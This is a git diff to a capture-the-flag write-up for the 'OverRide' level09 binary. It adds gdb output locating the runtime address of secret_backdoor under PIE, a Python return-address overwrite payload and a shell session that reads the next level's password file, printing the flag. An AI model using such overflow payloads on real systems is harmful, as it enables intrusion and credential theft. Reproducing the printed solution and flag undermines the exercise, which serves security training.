@@ -172,8 +172,18 @@ p/d 0x7fffffffe598 - 0x7fffffffe4d0 = 200
 ```
 
 the offset is 200 + secret_backdoor = 208
-
+```
 (gdb) p &secret_backdoor
+0x88c
+```
+PIE/ASLR enabled
+
+i should get the address in runtime
+```
+(gdb) p &secret_backdoor
+0x55555555488c
+```
+
 
 ```py
 import struct
@@ -184,7 +194,7 @@ msg_len = "\xd0"
 
 msg = "B" * 200
 
-eip = struct.pack('Q', 0x000000000000088c)
+eip = struct.pack('Q', 0x55555555488c)
 
 bash = "/bin/sh"
 
@@ -204,7 +214,24 @@ level09@OverRide:~$ (cat pay; cat) | ./level09
  
  I:  unsigned integer (4 bytes)
 
-
+```
+level09@OverRide:~$ chmod 777 .
+level09@OverRide:~$ nano py.py
+level09@OverRide:~$ python py.py > pay
+level09@OverRide:~$ (cat pay ; cat) | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+pwd
+/home/users/level09
+whoami
+end
+cat //home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+```
 
 
 
